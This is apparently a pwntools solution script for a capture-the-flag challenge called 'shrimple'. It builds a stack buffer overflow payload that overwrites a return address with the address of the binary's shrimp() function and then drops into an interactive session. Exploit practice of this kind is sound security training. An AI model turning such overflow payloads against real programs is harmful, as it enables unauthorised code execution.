from pwn import *

context.log_level = 'DEBUG'

io = process("./shrimple")
# io = remote("chal.competitivecyber.club", 8884)

# need to exec shrimp()
shrimp = ELF("./shrimple").symbols['shrimp']
print('shrimp ->', p64(shrimp).hex())
# 0x7d12400000000000

t = 'so easy and so shrimple, have fun!'
pad = (b'A' * (64 - len(t))) + (b'B' * 8)

print(io.recvuntil(b'>>'))

print('ROUND 1')
payload = pad + p64(shrimp)
print('payload ->', payload.hex())
io.sendline(payload)
print(io.recvuntil(b'>>'))

# print('ROUND 2')
# payload = pad + p64(shrimp)
# io.sendline(payload)
# print(io.recvuntil(b'>>'))

# print('ROUND 3')
# payload = pad + p64(shrimp)
# io.sendline(payload)

io.interactive()
